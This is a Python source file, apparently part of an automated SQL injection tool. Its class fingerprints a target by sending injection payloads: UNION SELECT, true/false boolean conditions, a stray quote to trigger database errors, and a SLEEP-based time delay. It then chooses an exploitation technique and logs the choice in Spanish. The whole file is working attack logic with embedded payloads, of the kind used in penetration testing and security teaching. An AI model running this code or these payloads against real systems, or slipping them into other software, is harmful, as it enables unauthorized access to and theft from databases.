from __future__ import annotations

from dataclasses import dataclass, field
from typing import Callable, Optional

from .discovery import ProbeResult

Probe = Callable[[str], ProbeResult]
TimeProbe = Callable[[str], float]


@dataclass
class Recon:
    injectable: bool = False
    quote: str = ""
    signals: dict = field(default_factory=dict)
    technique: str = "none"


class TechniqueSelector:
    def __init__(self, probe: Probe, time_probe: Optional[TimeProbe] = None,
                 say: Optional[Callable[[str], None]] = None) -> None:
        self.probe = probe
        self.time_probe = time_probe
        self.say = say or (lambda _m: None)

    def select(self) -> Recon:
        r = Recon()
        r.signals["boolean"] = self._boolean_viable(r)
        r.signals["error"] = self._error_visible()
        r.signals["time"] = self._time_delay(r.quote) if self.time_probe else None
        r.signals["union"] = self._union_viable()
        r.injectable = any(bool(v) for v in r.signals.values())
        r.technique = ("union" if r.signals["union"]
                       else "boolean" if r.signals["boolean"] else "none")
        extra = [k for k in ("error", "time") if r.signals.get(k)]
        self.say(f"[Recon] señales observables {r.signals} -> técnica elegida: {r.technique}"
                 + (f" (también detectadas: {extra})" if extra else ""))
        return r

    def _union_viable(self) -> bool:
        for q in ("'", ""):
            if not self.probe(f"-1{q} UNION SELECT 1000,1001-- -").blocked:
                return True
        return False

    def _boolean_viable(self, r: Recon) -> bool:
        for q in ("", "'"):
            true_r = self.probe(f"1{q} AND 1=1-- -")
            false_r = self.probe(f"1{q} AND 1=2-- -")
            if bool(true_r.cells) and not bool(false_r.cells):
                r.quote = q
                return True
        return False

    def _error_visible(self) -> bool:
        return self.probe("1'").db_error

    def _time_delay(self, q: str) -> bool:
        base = self.time_probe(f"1{q}")
        slow = self.time_probe(f"1{q} AND SLEEP(2)-- -")
        return (slow - base) >= 1.5
